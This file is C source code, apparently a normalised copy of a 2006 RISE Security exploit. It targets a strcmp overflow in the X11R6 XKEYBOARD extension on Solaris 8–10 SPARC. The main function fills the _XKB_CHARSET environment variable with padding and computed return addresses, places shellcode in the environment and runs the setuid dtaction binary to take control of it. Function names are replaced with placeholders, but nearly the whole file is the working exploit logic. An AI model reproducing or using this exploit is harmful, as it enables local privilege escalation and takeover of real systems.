#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  platform ;
typedef  int /*<<< orphan*/  envp ;
typedef  int /*<<< orphan*/  display ;

/* Variables and functions */
 int ADRSIZE ; 
 int ARGSIZE ; 
 int BUFSIZE ; 
 int ENVSIZE ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int FRMSIZE ; 
 int /*<<< orphan*/  FUNC0 (int,int,int) ; 
 int PFMSIZE ; 
 int PRGSIZE ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int /*<<< orphan*/ ,char**) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC3 () ; 
 scalar_t__ FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC9 (char*,int,char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int FUNC12 (int /*<<< orphan*/ ,char*,int) ; 

int FUNC13(int argc,char **argv){
    char buf[8192],display[256],platform[256],addr[8][4],*envp[6],*p;
    int base,offset,i,flag=0;

    FUNC8("X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 SPARC\n");
    FUNC8("Copyright 2006 RISE Security <contact@risesecurity.org>\n\n");

    if(argc!=3){
        FUNC5(stderr,"usage: %s sprintf|strcpy xserver:display\n",argv[0]);
        FUNC2(EXIT_FAILURE);
    }

    if(!FUNC11(argv[1],"sprintf")) flag=1;
    if(!FUNC11(argv[1],"strcpy")) flag=2;

    if(!flag){
        FUNC5(stderr,"usage: %s sprintf|strcpy xserver:display\n",argv[0]);
        FUNC2(EXIT_FAILURE);
    }

    FUNC9(display,sizeof(display),"DISPLAY=%s",argv[2]);

    if(FUNC12(SI_PLATFORM,platform,sizeof(platform))==-1){
        FUNC7("sysinfo");
        FUNC2(EXIT_FAILURE);
    }

    base=((int)argv[0]|0xffff);
    base++;

    offset=ARGSIZE+ENVSIZE+PFMSIZE+PRGSIZE;
    FUNC0(offset,1,sizeof(envp)-1);

    *((int *)addr[0])=base-offset+ARGSIZE+BUFSIZE;
    *((int *)addr[1])=base-offset+ARGSIZE+BUFSIZE+FRMSIZE;
    *((int *)addr[2])=base-offset+ARGSIZE+BUFSIZE+FRMSIZE+ADRSIZE;

    switch(flag){
    case 1: *((int *)addr[3])=(int)FUNC4("sprintf")-4; break;
    case 2: *((int *)addr[3])=(int)FUNC4("strcpy")-4;
    }

    *((int *)addr[4])=(int)FUNC3()+4;
    *((int *)addr[5])=*((int *)addr[4])-8;

    p=buf;
    FUNC10(p,"_XKB_CHARSET=");
    p=buf+13;
    for(i=0;i<256;i++) *p++='A';
    for(i=0;i<66;i++) *p++=addr[1][i%4];
    *p='\0';

    FUNC6(buf+13+256+56,addr[0],4);
    FUNC6(buf+13+256+60,addr[3],4);

    p=buf+1024;;
    for(i=0;i<(FRMSIZE-1);i++) *p++=addr[1][i%4];
    *p='\0';

    FUNC6(buf+1024+32,addr[4],4);
    FUNC6(buf+1024+36,addr[2],4);
    FUNC6(buf+1024+60,addr[5],4);

    p=buf+2048;
    for(i=0;i<(ADRSIZE-1);i++) *p++=addr[1][i%4];
    *p='\0';

    envp[0]=&buf[0];
    envp[1]=&buf[1024];
    envp[2]=&buf[2048];
    envp[3]=shellcode;
    envp[4]=display;
    envp[5]=NULL;

    FUNC1("/usr/dt/bin/dtaction","AAAAAAA",0,envp);

    FUNC2(EXIT_FAILURE);
}